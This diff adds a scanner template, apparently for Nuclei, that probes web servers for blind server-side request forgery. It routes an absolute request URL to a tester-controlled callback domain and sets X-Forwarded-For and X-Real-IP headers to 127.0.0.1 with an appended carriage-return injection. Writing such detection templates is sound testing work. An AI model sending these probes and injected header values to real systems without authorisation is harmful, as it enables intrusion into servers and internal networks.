@@ -1,0 +1,24 @@
+id: 0x141
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET http://{{Host}}.{{Port}}.BSSRF-141.{{MY-DOMAIN}}/ HTTP/1.0
+      X-Forwarded-For: 127.0.0.1%0d
+      X-Real-IP: 127.0.0.1%0d
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Cache-Control: no-transform
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
